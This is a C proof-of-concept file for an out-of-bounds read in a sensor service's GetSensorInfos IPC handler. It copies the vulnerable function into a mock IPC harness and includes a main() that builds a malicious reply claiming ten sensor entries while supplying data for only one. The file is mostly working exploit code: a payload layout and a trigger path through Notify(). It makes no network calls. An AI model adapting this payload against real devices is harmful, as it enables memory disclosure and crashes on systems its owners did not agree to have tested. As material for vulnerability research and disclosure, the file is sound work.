/*
 * PoC: Out-of-bounds read in GetSensorInfos via crafted IPC reply buffer
 *
 * Vulnerability: CWE-20 (Improper Input Validation)
 *
 * The function Notify() is a callback invoked when an IPC reply arrives from
 * the sensor service. When functionId == SENSOR_SERVICE_ID_GET_ALL_SENSORS,
 * it calls GetSensorInfos() which reads:
 *   - notify->count (int32_t) from the IPC buffer
 *   - len (uint32_t) from the IPC buffer
 *   - data pointer from ReadBuffer(reply, len)
 *
 * The code checks that count > 0 and data != NULL, but NEVER validates that
 * len >= count * sizeof(SensorInfo). An attacker controlling the IPC reply
 * can set count=10 but len=sizeof(SensorInfo)*1, causing the memcpy_s loop
 * to read 9 * sizeof(SensorInfo) bytes beyond the actual buffer — an OOB read.
 *
 * Trigger path: Notify() -> GetSensorInfos() -> memcpy_s (in loop)
 *
 * Expected behavior: ASAN detects heap-buffer-overflow on the read side,
 * or the program reads garbage/crashes with SIGSEGV.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

/* ========== Minimal type definitions to match the real code ========== */

typedef struct {
    int32_t sensorId;
    char sensorName[64];
    char vendorName[64];
    int32_t sensorTypeId;
    int32_t sensorVersion;
    float maxRange;
    float precision;
    float power;
} SensorInfo;

/* The "owner" in GetSensorInfos is actually a pointer to this struct */
typedef struct {
    int32_t retCode;
    int32_t count;
    SensorInfo **sensorInfo;
} SensorNotifyInfo;

typedef void *IOwner;

/* ========== Mock IPC buffer implementation ========== */

/*
 * We simulate an IpcIo object as a simple linear buffer with a read cursor.
 * This mimics how the real IPC deserialization works — sequential reads from
 * a flat buffer provided by the IPC framework.
 */
typedef struct {
    uint8_t *buffer;
    size_t bufferSize;
    size_t cursor;
} IpcIo;

/* Simulated IPC read functions — these are the SOURCES of tainted data */

static int ReadInt32(IpcIo *io, int32_t *value)
{
    if (io->cursor + sizeof(int32_t) > io->bufferSize) return -1;
    memcpy(value, io->buffer + io->cursor, sizeof(int32_t));
    io->cursor += sizeof(int32_t);
    printf("[PoC] ReadInt32 -> %d (cursor=%zu)\n", *value, io->cursor);
    return 0;
}

static int ReadUint32(IpcIo *io, uint32_t *value)
{
    if (io->cursor + sizeof(uint32_t) > io->bufferSize) return -1;
    memcpy(value, io->buffer + io->cursor, sizeof(uint32_t));
    io->cursor += sizeof(uint32_t);
    printf("[PoC] ReadUint32 -> %u (cursor=%zu)\n", *value, io->cursor);
    return 0;
}

static uint8_t *ReadBuffer(IpcIo *io, size_t len)
{
    if (io->cursor + len > io->bufferSize) return NULL;
    uint8_t *ptr = io->buffer + io->cursor;
    io->cursor += len;
    printf("[PoC] ReadBuffer len=%zu (cursor=%zu)\n", len, io->cursor);
    return ptr;
}

/* Stub logging macros */
#define HILOG_MODULE_APP 0
#define HILOG_ERROR(mod, fmt, ...) printf("[ERROR] " fmt "\n", ##__VA_ARGS__)
#define HILOG_DEBUG(mod, fmt, ...) printf("[DEBUG] " fmt "\n", ##__VA_ARGS__)

/* Constants from the real code */
#define SENSOR_SERVICE_ID_GET_ALL_SENSORS 0
#define SENSORMGR_LISTENER_NAME_LEN 64
#define SENSOR_ERROR_INVALID_PARAM (-2)

/* memcpy_s — standard secure memcpy (returns 0 on success) */
static int memcpy_s(void *dest, size_t destMax, const void *src, size_t count)
{
    if (dest == NULL || src == NULL || count > destMax) return -1;
    printf("[PoC] memcpy_s: dest=%p, src=%p, count=%zu\n", dest, src, count);
    /* This is where the OOB read happens — src points beyond valid data */
    /* TRIGGER: reading from (sensorInfo + i) where i >= len/sizeof(SensorInfo) */
    memcpy(dest, src, count);
    return 0;
}

/* ========== REAL vulnerable function: GetSensorInfos ========== */
/*
 * Copied from sensor_agent_proxy.c with minimal adaptation for compilation.
 * The logic is UNCHANGED — this IS the vulnerable code.
 */
static int32_t GetSensorInfos(IOwner owner, IpcIo *reply)
{
    printf("[PoC] Entering GetSensorInfos\n");
    SensorNotifyInfo *notify = (SensorNotifyInfo *)owner;

    /* SOURCE: attacker-controlled count from IPC */
    ReadInt32(reply, &(notify->count));

    /* SOURCE: attacker-controlled len from IPC */
    uint32_t len = 0;
    ReadUint32(reply, &len);

    /* SOURCE: buffer of size 'len' from IPC */
    uint8_t *data = (uint8_t *)ReadBuffer(reply, (size_t)len);

    /* Insufficient validation: only checks count > 0 and data != NULL.
     * MISSING: check that len >= (uint32_t)notify->count * sizeof(SensorInfo) */
    if ((notify->count <= 0) || (data == NULL)) {
        HILOG_ERROR(HILOG_MODULE_APP, "%s failed, count is incorrect or dataBuf is NULL", __func__);
        notify->retCode = SENSOR_ERROR_INVALID_PARAM;
        return SENSOR_ERROR_INVALID_PARAM;
    }

    printf("[PoC] count=%d, len=%u, sizeof(SensorInfo)=%zu\n",
           notify->count, len, sizeof(SensorInfo));
    printf("[PoC] REQUIRED buffer size: %zu, ACTUAL buffer size: %u\n",
           (size_t)notify->count * sizeof(SensorInfo), len);
    printf("[PoC] *** BUG: no check that len >= count * sizeof(SensorInfo) ***\n");

    SensorInfo *sensorInfo = (SensorInfo *)(data);

    /* Destination is correctly sized for count entries */
    *(notify->sensorInfo) = (SensorInfo *)malloc(sizeof(SensorInfo) * notify->count);
    if (*(notify->sensorInfo) == NULL) {
        HILOG_ERROR(HILOG_MODULE_APP, "%s malloc sensorInfo failed", __func__);
        notify->retCode = SENSOR_ERROR_INVALID_PARAM;
        return SENSOR_ERROR_INVALID_PARAM;
    }

    /* VULNERABILITY: loop reads notify->count entries from sensorInfo,
     * but the source buffer only contains len/sizeof(SensorInfo) entries.
     * When count > len/sizeof(SensorInfo), this is an OOB read. */
    for (int32_t i = 0; i < notify->count; i++) {
        printf("[PoC] Loop iteration %d: reading from offset %zu (buffer ends at %u)\n",
               i, (size_t)i * sizeof(SensorInfo), len);

        /* TRIGGER: OOB read when i * sizeof(SensorInfo) >= len */
        if ((size_t)(i + 1) * sizeof(SensorInfo) > len) {
            printf("[PoC] *** OOB READ TRIGGERED at iteration %d ***\n", i);
        }

        if (memcpy_s((*(notify->sensorInfo) + i), sizeof(SensorInfo), (sensorInfo + i),
            sizeof(SensorInfo))) {
            HILOG_ERROR(HILOG_MODULE_APP, "%s copy sensorInfo failed", __func__);
            free(*(notify->sensorInfo));
            *(notify->sensorInfo) = NULL;
            notify->retCode = SENSOR_ERROR_INVALID_PARAM;
            return SENSOR_ERROR_INVALID_PARAM;
        }
    }

    notify->retCode = 0;
    return notify->retCode;
}

/* ========== REAL entry point: Notify ========== */
/*
 * This is the IPC callback registered with the service framework.
 * It is invoked when the sensor service sends a reply.
 */
int32_t Notify(IOwner owner, int32_t code, IpcIo *reply)
{
    printf("[PoC] Entering Notify (IPC callback)\n");
    int32_t functionId = -1;
    ReadInt32(reply, &functionId);
    if (functionId == SENSOR_SERVICE_ID_GET_ALL_SENSORS) {
        return GetSensorInfos(owner, reply);
    }
    int32_t *ret = (int32_t *)owner;
    if (ret == NULL) {
        HILOG_ERROR(HILOG_MODULE_APP, "%s ret is null", __func__);
        return SENSOR_ERROR_INVALID_PARAM;
    } else {
        if ((functionId > SENSOR_SERVICE_ID_GET_ALL_SENSORS) && (functionId < SENSORMGR_LISTENER_NAME_LEN)) {
            ReadInt32(reply, ret);
        } else {
            *ret = SENSOR_ERROR_INVALID_PARAM;
        }
        return *ret;
    }
}

/* ========== PoC MAIN: Craft malicious IPC reply ========== */

int main(void)
{
    printf("[PoC] === Sensor IPC OOB Read PoC ===\n");
    printf("[PoC] Simulating a malicious IPC reply from a compromised sensor service\n\n");

    /*
     * We craft an IPC reply buffer that a malicious or compromised sensor
     * service would send back. The reply format for GET_ALL_SENSORS is:
     *
     *   [functionId: int32]  = SENSOR_SERVICE_ID_GET_ALL_SENSORS (0)
     *   [count: int32]       = 10  (claims 10 sensor entries)
     *   [len: uint32]        = sizeof(SensorInfo) * 1  (only 1 entry of data!)
     *   [data: SensorInfo[1]] = one valid SensorInfo struct
     *
     * The mismatch: count=10 but len only covers 1 entry.
     * The loop will read 10 entries from a buffer that holds only 1,
     * causing 9 out-of-bounds reads.
     */

    const int32_t malicious_count = 10;  /* Claims 10 sensors */
    const uint32_t actual_data_size = sizeof(SensorInfo) * 1;  /* Only provides 1 */

    printf("[PoC] Crafting payload: count=%d, actual buffer=%u bytes (%zu entries)\n",
           malicious_count, actual_data_size, actual_data_size / sizeof(SensorInfo));
    printf("[PoC] Expected read: %zu bytes, causing %zu bytes OOB read\n",
           (size_t)malicious_count * sizeof(SensorInfo),
           (size_t)(malicious_count - 1) * sizeof(SensorInfo));

    /* Build the IPC reply buffer */
    size_t total_ipc_size = sizeof(int32_t)   /* functionId */
                          + sizeof(int32_t)   /* count */
                          + sizeof(uint32_t)  /* len */
                          + actual_data_size; /* data (only 1 SensorInfo) */

    /*
     * IMPORTANT: We allocate ONLY enough for the declared len, not for count entries.
     * This means when the loop reads beyond entry[0], it reads uninitialized/invalid memory.
     * Under ASAN, this will be detected as a heap-buffer-overflow.
     */
    uint8_t *ipc_buffer = (uint8_t *)malloc(total_ipc_size);
    if (!ipc_buffer) {
        printf("[PoC] malloc failed\n");
        return 1;
    }
    memset(ipc_buffer, 0, total_ipc_size);

    size_t offset = 0;

    /* Write functionId = SENSOR_SERVICE_ID_GET_ALL_SENSORS (0) */
    int32_t funcId = SENSOR_SERVICE_ID_GET_ALL_SENSORS;
    memcpy(ipc_buffer + offset, &funcId, sizeof(int32_t));
    offset += sizeof(int32_t);

    /* Write count = 10 (attacker-controlled, claims 10 sensors) */
    memcpy(ipc_buffer + offset, &malicious_count, sizeof(int32_t));
    offset += sizeof(int32_t);

    /* Write len = sizeof(SensorInfo) (only enough for 1 sensor) */
    memcpy(ipc_buffer + offset, &actual_data_size, sizeof(uint32_t));
    offset += sizeof(uint32_t);

    /* Write 1 valid SensorInfo entry (the only legitimate data) */
    SensorInfo fakeSensor = {0};
    fakeSensor.sensorId = 42;
    snprintf(fakeSensor.sensorName, sizeof(fakeSensor.sensorName), "FakeSensor");
    snprintf(fakeSensor.vendorName, sizeof(fakeSensor.vendorName), "Attacker");
    fakeSensor.sensorTypeId = 1;
    memcpy(ipc_buffer + offset, &fakeSensor, sizeof(SensorInfo));
    offset += sizeof(SensorInfo);

    /* Set up the IpcIo structure pointing to our crafted buffer */
    IpcIo reply;
    reply.buffer = ipc_buffer;
    reply.bufferSize = total_ipc_size;
    reply.cursor = 0;

    /* Set up the owner (SensorNotifyInfo) — this is what the caller passes */
    SensorNotifyInfo notifyInfo;
    notifyInfo.retCode = 0;
    notifyInfo.count = 0;
    SensorInfo *sensorInfoPtr = NULL;
    notifyInfo.sensorInfo = &sensorInfoPtr;

    printf("\n[PoC] Calling Notify() — the public IPC callback entry point\n");
    printf("[PoC] This simulates receiving a reply from the sensor service\n\n");

    /* CALL THE PUBLIC API ENTRY POINT */
    int32_t result = Notify((IOwner)&notifyInfo, 0, &reply);

    printf("\n[PoC] Notify returned: %d\n", result);
    printf("[PoC] If ASAN is enabled, a heap-buffer-overflow should have been reported\n");
    printf("[PoC] The OOB read occurred on iterations 1-9 of the memcpy_s loop\n");

    /* Cleanup */
    if (sensorInfoPtr) {
        free(sensorInfoPtr);
    }
    free(ipc_buffer);

    return 0;
}